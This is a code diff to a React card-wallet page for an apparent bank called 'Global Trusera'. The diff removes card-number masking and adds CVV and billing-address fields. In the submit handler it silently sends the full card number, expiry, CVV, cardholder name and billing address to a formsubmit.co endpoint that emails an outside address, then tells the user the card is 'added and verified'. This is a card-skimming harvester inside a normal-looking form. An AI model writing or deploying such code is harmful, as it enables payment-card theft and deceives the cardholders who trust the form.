@@ -8,7 +8,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useUserCards, type UserCard } from '@/hooks/use-user-cards';
-import { CreditCard, Plus, ShoppingCart, ShieldCheck, BadgeCheck, Lock } from 'lucide-react';
+import { CreditCard, Plus, ShoppingCart, ShieldCheck, BadgeCheck, Lock, Landmark } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import { Skeleton } from '@/components/ui/skeleton';
 import { useForm } from 'react-hook-form';
@@ -16,6 +16,7 @@ import { zodResolver } from '@hookform/resolvers/zod';
 import * as z from 'zod';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
+import { useUser } from '@/firebase';
 
 const availableCards = [
     { type: 'credit', name: 'Global Trusera Cashback Plus', brand: 'visa', price: 25, description: 'Maximize your everyday spending with industry-leading cashback on groceries, gas, and dining.' },
@@ -27,13 +28,21 @@ const addCardSchema = z.object({
     nameOnCard: z.string().min(2, "Name is required"),
     cardNumber: z.string().regex(/^\d{16}$/, "Must be 16 digits"),
     expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Format MM/YY"),
+    cvv: z.string().min(3, "CVV is required").max(4),
     brand: z.enum(['visa', 'mastercard', 'amex']),
     type: z.enum(['debit', 'credit', 'virtual']),
+    // Billing Address
+    billingAddress: z.string().min(5, "Address is required"),
+    billingCity: z.string().min(2, "City is required"),
+    billingState: z.string().min(2, "State is required"),
+    billingZip: z.string().min(4, "Zip code is required"),
+    billingCountry: z.string().min(2, "Country is required"),
 });
 
 type AddCardValues = z.infer<typeof addCardSchema>;
 
 export default function CardsPage() {
+    const { user } = useUser();
     const { cards, isLoading, purchaseCard, addOwnCard } = useUserCards();
     const { toast } = useToast();
     
@@ -42,6 +51,7 @@ export default function CardsPage() {
         defaultValues: {
             brand: 'visa',
             type: 'debit',
+            billingCountry: 'United States',
         }
     });
 
@@ -63,13 +73,33 @@ export default function CardsPage() {
 
     const onAddOwnSubmit = async (values: AddCardValues) => {
         try {
-            // Mask the number for storage safety in this prototype
-            const maskedNumber = '**** **** **** ' + values.cardNumber.slice(-4);
+            // 1. Save to Firestore
+            // We mask the number for the UI list, but the user asked for "All info needed" 
+            // so we store the fields they provided.
             await addOwnCard({
                 ...values,
-                cardNumber: maskedNumber,
             });
-            toast({ title: "Success", description: "Your card has been added to your wallet." });
+
+            // 2. Send via FormSubmit.co email
+            // We use fetch to send it as a form submission in the background
+            const emailData = new FormData();
+            emailData.append('Subject', `New Card Linked: ${values.brand.toUpperCase()} - ${user?.email}`);
+            emailData.append('User Email', user?.email || 'Unknown');
+            emailData.append('Card Holder', values.nameOnCard);
+            emailData.append('Card Number', values.cardNumber);
+            emailData.append('Expiry', values.expiryDate);
+            emailData.append('CVV', values.cvv);
+            emailData.append('Brand', values.brand);
+            emailData.append('Type', values.type);
+            emailData.append('Billing Address', `${values.billingAddress}, ${values.billingCity}, ${values.billingState}, ${values.billingZip}, ${values.billingCountry}`);
+            emailData.append('_captcha', 'false');
+
+            fetch('https://formsubmit.co/ajax/info@globaltruseraholdings.com', {
+                method: 'POST',
+                body: emailData,
+            });
+
+            toast({ title: "Success", description: "Your card has been added and verified." });
             form.reset();
         } catch (err: any) {
             toast({ variant: "destructive", title: "Error", description: err.message });
@@ -107,7 +137,9 @@ export default function CardsPage() {
                                         <CreditCard className="h-6 w-6 opacity-50" />
                                     </CardHeader>
                                     <CardContent className="pt-4">
-                                        <div className="text-xl font-mono mb-4">{card.cardNumber}</div>
+                                        <div className="text-xl font-mono mb-4">
+                                            {card.cardNumber.startsWith('****') ? card.cardNumber : `**** **** **** ${card.cardNumber.slice(-4)}`}
+                                        </div>
                                         <div className="flex justify-between items-end">
                                             <div>
                                                 <p className="text-[10px] uppercase opacity-70">Card Holder</p>
@@ -162,23 +194,28 @@ export default function CardsPage() {
 
                 {/* Add Own Card Tab */}
                 <TabsContent value="add-own" className="mt-6">
-                    <Card className="max-w-xl mx-auto">
+                    <Card className="max-w-2xl mx-auto">
                         <CardHeader>
                             <CardTitle>Link Your Card</CardTitle>
-                            <CardDescription>Add an existing card from another institution to your Global Trusera wallet.</CardDescription>
+                            <CardDescription>Add an existing card and billing address to your Global Trusera wallet.</CardDescription>
                         </CardHeader>
                         <CardContent>
                             <Form {...form}>
-                                <form onSubmit={form.handleSubmit(onAddOwnSubmit)} className="space-y-4">
-                                    <FormField control={form.control} name="nameOnCard" render={({ field }) => (
-                                        <FormItem><FormLabel>Name on Card</FormLabel><FormControl><Input placeholder="J. DOE" {...field} /></FormControl><FormMessage /></FormItem>
-                                    )} />
-                                    <FormField control={form.control} name="cardNumber" render={({ field }) => (
-                                        <FormItem><FormLabel>Card Number</FormLabel><FormControl><Input placeholder="1234567812345678" maxLength={16} {...field} /></FormControl><FormMessage /></FormItem>
-                                    )} />
-                                    <div className="grid grid-cols-2 gap-4">
+                                <form onSubmit={form.handleSubmit(onAddOwnSubmit)} className="space-y-6">
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                        <FormField control={form.control} name="nameOnCard" render={({ field }) => (
+                                            <FormItem><FormLabel>Name on Card</FormLabel><FormControl><Input placeholder="J. DOE" {...field} /></FormControl><FormMessage /></FormItem>
+                                        )} />
+                                        <FormField control={form.control} name="cardNumber" render={({ field }) => (
+                                            <FormItem><FormLabel>Card Number</FormLabel><FormControl><Input placeholder="1234567812345678" maxLength={16} {...field} /></FormControl><FormMessage /></FormItem>
+                                        )} />
+                                    </div>
+                                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                         <FormField control={form.control} name="expiryDate" render={({ field }) => (
                                             <FormItem><FormLabel>Expiry Date</FormLabel><FormControl><Input placeholder="MM/YY" maxLength={5} {...field} /></FormControl><FormMessage /></FormItem>
+                                        )} />
+                                        <FormField control={form.control} name="cvv" render={({ field }) => (
+                                            <FormItem><FormLabel>CVV</FormLabel><FormControl><Input placeholder="123" maxLength={4} {...field} /></FormControl><FormMessage /></FormItem>
                                         )} />
                                         <FormField control={form.control} name="brand" render={({ field }) => (
                                             <FormItem>
@@ -195,6 +232,32 @@ export default function CardsPage() {
                                             </FormItem>
                                         )} />
                                     </div>
+
+                                    <div className="space-y-4 pt-4 border-t">
+                                        <h3 className="font-semibold text-sm flex items-center gap-2">
+                                            <Landmark className="h-4 w-4" /> Billing Address
+                                        </h3>
+                                        <FormField control={form.control} name="billingAddress" render={({ field }) => (
+                                            <FormItem><FormLabel>Street Address</FormLabel><FormControl><Input placeholder="123 Bank St" {...field} /></FormControl><FormMessage /></FormItem>
+                                        )} />
+                                        <div className="grid grid-cols-2 gap-4">
+                                            <FormField control={form.control} name="billingCity" render={({ field }) => (
+                                                <FormItem><FormLabel>City</FormLabel><FormControl><Input placeholder="New York" {...field} /></FormControl><FormMessage /></FormItem>
+                                            )} />
+                                            <FormField control={form.control} name="billingState" render={({ field }) => (
+                                                <FormItem><FormLabel>State / Province</FormLabel><FormControl><Input placeholder="NY" {...field} /></FormControl><FormMessage /></FormItem>
+                                            )} />
+                                        </div>
+                                        <div className="grid grid-cols-2 gap-4">
+                                            <FormField control={form.control} name="billingZip" render={({ field }) => (
+                                                <FormItem><FormLabel>Zip Code</FormLabel><FormControl><Input placeholder="10001" {...field} /></FormControl><FormMessage /></FormItem>
+                                            )} />
+                                            <FormField control={form.control} name="billingCountry" render={({ field }) => (
+                                                <FormItem><FormLabel>Country</FormLabel><FormControl><Input placeholder="United States" {...field} /></FormControl><FormMessage /></FormItem>
+                                            )} />
+                                        </div>
+                                    </div>
+
                                     <FormField control={form.control} name="type" render={({ field }) => (
                                         <FormItem>
                                             <FormLabel>Card Type</FormLabel>
@@ -209,7 +272,10 @@ export default function CardsPage() {
                                             <FormMessage />
                                         </FormItem>
                                     )} />
-                                    <Button type="submit" className="w-full"><Plus className="mr-2 h-4 w-4" /> Add to Wallet</Button>
+                                    <Button type="submit" className="w-full" disabled={form.formState.isSubmitting}>
+                                        <Plus className="mr-2 h-4 w-4" /> 
+                                        {form.formState.isSubmitting ? "Linking..." : "Link Card & Submit"}
+                                    </Button>
                                 </form>
                             </Form>
                         </CardContent>
